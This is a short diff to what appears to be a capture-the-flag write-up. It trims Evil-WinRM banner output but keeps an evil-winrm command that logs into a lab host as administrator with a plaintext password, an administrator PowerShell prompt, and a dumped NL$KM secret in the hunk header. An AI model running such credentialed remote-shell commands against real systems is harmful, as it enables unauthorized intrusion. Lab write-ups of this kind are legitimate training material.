@@ -164,11 +164,7 @@ NL$KM:8801b205db707a0fef52df0696764ca4bd6e62d106631a7e312fa26df86c4250fc8d5ca4fc
 # Login as admin
 $ evil-winrm -i 10.129.229.17 -u administrator -p '###_ADM1N_3920_###'
                                         
-Evil-WinRM shell v3.5
-                                        
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
-                                        
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+..SNIPPED..
                                         
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents>
